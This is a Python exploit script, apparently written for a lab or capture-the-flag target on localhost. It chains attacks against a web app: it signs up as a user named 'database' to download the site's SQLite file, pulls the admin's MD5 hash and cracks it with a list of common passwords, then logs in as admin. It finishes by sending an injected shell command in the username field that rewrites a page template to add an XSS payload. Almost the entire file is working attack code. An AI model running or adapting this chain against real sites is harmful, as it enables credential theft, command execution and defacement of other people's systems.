import logging
import requests
import http.client
import sqlite3

import hashlib
is_docker = True
ADMIN_PASSWORD = ['123456',
                   'password',
                   '123456789',
                   'qwerty',
                   'abc123',
                   'qwertyuiop',
                   '111111',
                   'iloveyou',
                   '123123',
                   'qwerty123',
                   'admin',
                   '654321',
                   '555555',
                   'lovely',
                   '7777777',
                   'princess',
                   'dragon',
                   'donald',
                   'monkey',
                   'football',
                   'charlie',
                   'aa123456',
                   'freedom',
                   'letmein',
                   'trustno1',
                   'baseball',
                   'master',
                   'sunshine',
                   'shadow',
                   'superman',
                   'ninja',
                   'mustang',
                   'batman',
                   'starwars',
                   'solo',
                   'welcome',
                   'flower',
                   'loveme',
                   'whatever']

if is_docker:
    domain = "http://host.docker.internal:80"
else:
    domain = "http://localhost:80" 

url_signup = f"{domain}/signup"
url_login = f"{domain}/login"
url_admin = f"{domain}/admin"

# Step 1: Create a user named database
hacker_data = {
    "username": "database",
    "password": "1"
}
response_signup = requests.post(url_signup, data=hacker_data)

# Step 2: Login as this user name maliciously download database
with requests.Session() as session:
    response_login = session.post(url_login, data=hacker_data)
    url_download = f"{domain}/download"
    response = session.get(url_download, params={"file": "database.db"})
    print(session.cookies)
    if response.status_code == 200:
        with open('database.db', 'wb') as file:
            file.write(response.content)
        print("File saved successfully!")
    else:
        print(f"Failed to download the file. Status code: {response.status_code}")

# Step 3: Connect to database and get admin's hashed password 
conn = sqlite3.connect('database.db')
cursor = conn.cursor()
sql = "SELECT password FROM users WHERE username='admin';"
cursor.execute(sql)
results = cursor.fetchall()

admin_hashed_password = results[0][0]
print (f"admin hashed password: {admin_hashed_password}")

cursor.close()
conn.close()

# Step 4: Start brute forcing MD5
def md5_hash(string):
    return hashlib.md5(string.encode()).hexdigest()

admin_password = None
for password in ADMIN_PASSWORD:
    hashed_value = md5_hash(password)
    if hashed_value == admin_hashed_password:
        admin_password = password 

print(f"admin password: {admin_password}")

# Step 5: Login as admin and start injection commands to admin's user delete api
with requests.Session() as session:
    admin_auth = {
        "username": "admin",
        "password": admin_password
    }

    # Injected command
    admin_exloiting_body = {
        "username": r'''none; sed -i 's|<html>|<img src onerror="javascript:alert('\''Hacked!'\'')"\>|' templates/app.html #'''
    }

    response_login = session.post(url_login, data=admin_auth)
    # We can do this because server is using system.os to directly execute command
    response = session.post(url_admin, data=admin_exloiting_body)
    if response.status_code == 200:
        print("Exploting Successfully, please open browser to check out hacked web app")
    else:
        print(f"Something wrong.  Status code: {response.status_code}")